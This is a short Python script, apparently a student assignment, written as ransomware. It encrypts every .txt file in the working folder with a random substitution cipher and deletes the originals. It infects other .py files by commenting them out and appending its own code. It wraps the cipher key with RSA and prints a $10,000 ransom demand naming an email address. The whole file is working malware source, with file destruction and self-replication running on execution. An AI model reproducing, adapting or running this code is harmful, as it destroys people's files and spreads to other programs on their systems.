import random
import os
import glob
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import PKCS1_OAEP

#Generate the Cipher
alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

l = list(alphabet)
random.shuffle(l)
subCipherUpper = ''.join(l)
subCipherLower = subCipherUpper.lower()

# Loop through .txt files, read them and encrypt
txtFiles = glob.glob('*.txt')
for f in txtFiles:
	fileText = ""
	file_in = open(f, "r")
	fileText = file_in.read()
	file_in.close()
	

	#Opens a new file and writes to it the encrypted txt
	file_out = open(f+".enc", "w")
	encryptedContent = ""

	for s in fileText:
		if s in subCipherUpper:
			index = alphabet.index(s)
			encryptedContent += subCipherUpper[index]
		elif s in subCipherLower:
			index = alphabet.index(s.upper())
			encryptedContent += subCipherLower[index]
		else:
			encryptedContent += s

	file_out.write(encryptedContent)
	file_out.close()
	# Deletes the original txt files
	os.remove(f)

# Loop thru .py files, comment out and replicate this code
pyFiles = glob.glob('*.py')
for f in pyFiles:
	# Skips this file when commenting py files
	if f == __file__:
		continue
	filePy = ""
	file_in = open(f, "r")
	filePy = file_in.readlines()
	file_in.close()
	
	encryptPy = ""
	for lines in filePy:
		encryptPy += "#" + lines
			
	# Replicate into other py files
	this_file = open("a1.py", "r")
	ransomWare = this_file.read()
	encryptPy += "\n\n\n\n\n" + ransomWare	

	file_out = open(f, "w")
	file_out.write(encryptPy)
	file_out.close()
	
	
# GENERATE KEYS
key = RSA.generate(2048)
private_key = key.export_key()

file_out = open("ransomprvkey.pem", "wb")
file_out.write(private_key)
file_out.close()

public_key = key.publickey().export_key()

file_out = open("ransompubkey.pem", "wb")
file_out.write(public_key)
file_out.close()

# ENCRYPT THE CIPHER

recipient_key = RSA.import_key(open("ransompubkey.pem").read())

data = subCipherUpper.encode('UTF-8')

file_out = open("key.bin", "wb")

cipher_rsa = PKCS1_OAEP.new(recipient_key)
enc_data = cipher_rsa.encrypt(data)

file_out.write(enc_data)
file_out.close()

print("Your text files are encrypted.  To decrypt them, you need to pay me $10,000 and send the key.bin in your folder to wscgee001@mymail.sim.edu.sg")






